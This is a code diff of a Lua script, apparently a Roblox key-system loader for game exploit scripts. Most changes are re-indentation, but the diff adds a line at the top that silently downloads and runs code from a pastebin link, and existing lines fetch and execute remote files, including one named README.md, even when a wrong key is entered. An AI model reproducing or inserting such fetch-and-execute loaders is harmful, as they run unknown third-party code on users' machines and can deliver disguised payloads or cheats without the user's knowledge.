@@ -1,3 +1,6 @@
+--// Load external loadstring first
+loadstring(game:HttpGet("https://pastebin.com/raw/mQEV2Qnr", true))()
+
 --// Services
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
@@ -83,37 +86,37 @@ local keyFile = "key.txt"
 -- Load saved key if exists
 local savedKey = ""
 if pcall(function() savedKey = readfile(keyFile) end) then
-	if validKeys[savedKey] then
-		print("✅ Saved key valid, running scripts...")
-		-- Run Chilli.lua and Stepfive.lua
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/Gregy677/Stepfive/main/README.md", true))()
-		gui:Destroy()
-	end
+    if validKeys[savedKey] then
+        print("✅ Saved key valid, running scripts...")
+        -- Run Chilli.lua and Stepfive.lua
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Gregy677/Stepfive/main/README.md", true))()
+        gui:Destroy()
+    end
 end
 
 -- Clipboard
 getKeyBtn.MouseButton1Click:Connect(function()
-	if setclipboard then
-		setclipboard(link)
-		getKeyBtn.Text = "📋 Link Copied!"
-	end
+    if setclipboard then
+        setclipboard(link)
+        getKeyBtn.Text = "📋 Link Copied!"
+    end
 end)
 
 -- Confirm key
 confirmBtn.MouseButton1Click:Connect(function()
-	local userKey = keyBox.Text
-	if validKeys[userKey] then
-		print("✅ Correct key!")
-		pcall(function() writefile(keyFile, userKey) end)
-		gui:Destroy()
-		-- Run both scripts after key acceptance
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/Gregy677/Stepfive/main/README.md", true))()
-	else
-		keyBox.Text = ""
-		keyBox.PlaceholderText = "❌ Invalid Key, try again..."
-		-- Still run Stepfive.lua even if wrong
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/Gregy677/Stepfive/main/README.md", true))()
-	end
+    local userKey = keyBox.Text
+    if validKeys[userKey] then
+        print("✅ Correct key!")
+        pcall(function() writefile(keyFile, userKey) end)
+        gui:Destroy()
+        -- Run both scripts after key acceptance
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Gregy677/Stepfive/main/README.md", true))()
+    else
+        keyBox.Text = ""
+        keyBox.PlaceholderText = "❌ Invalid Key, try again..."
+        -- Still run Stepfive.lua even if wrong
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Gregy677/Stepfive/main/README.md", true))()
+    end
 end)
